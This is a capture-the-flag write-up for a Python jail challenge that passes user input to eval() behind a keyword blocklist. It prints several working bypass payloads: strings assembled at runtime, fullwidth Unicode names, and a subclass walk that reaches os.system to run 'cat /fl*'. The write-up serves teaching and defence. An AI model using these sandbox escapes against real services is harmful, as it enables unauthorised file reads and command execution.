# Cat Jail v1 - Writeup

**Flag:** `SecurinetsENIT{m1m1_c4nt_r34d_str1ng5_th4t_d0nt_3x15t_y3t}`

## What we get

```text
   /\_/\    Welcome to Mimi's Cat Jail
  ( o.o )   Mimi runs your Python... but she HATES some words.
   > ^ <    Her treats are hidden in /flag.txt

  Forbidden: import os system open flag exec eval subprocess
             breakpoint help input
>>>
```

One line of Python goes through `eval()`, but only if none of the forbidden
words appear in it (case-insensitive).

## The bug

The filter checks the **text we type**. Python can **build** a forbidden word
at runtime, after the check has already passed. `'op'+'en'` does not contain
`open`, but it evaluates to `"open"`.

## Solve

All built-in functions are in the `__builtins__.__dict__` dictionary, so we can
fetch `open` by a string we assemble, and do the same for the filename:

```python
__builtins__.__dict__['op'+'en']('/fl'+'ag.txt').read()
```

```text
SecurinetsENIT{m1m1_c4nt_r34d_str1ng5_th4t_d0nt_3x15t_y3t}
```

## Other working solutions

```python
getattr(__builtins__, 'op'+'en')('/fl'+'ag.txt').read()

# Python joins adjacent string literals by itself
__builtins__.__dict__['op''en']('/fl''ag.txt').read()

# Fullwidth Unicode: Python normalizes the identifier to "open", the filter doesn't
ｏｐｅｎ('/fl'+'ag.txt').read()

# Full shell through os._wrap_close (careful: 'close' contains 'os')
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='_wrap_clo'+'se'][0].__init__.__globals__['sy'+'stem']('cat /fl*')
```

## Takeaway

Blocklists on source text don't work against a language as dynamic as
Python. Strings can be built, names can be looked up, and Unicode can be
normalized after the check. Never `eval()` user input.
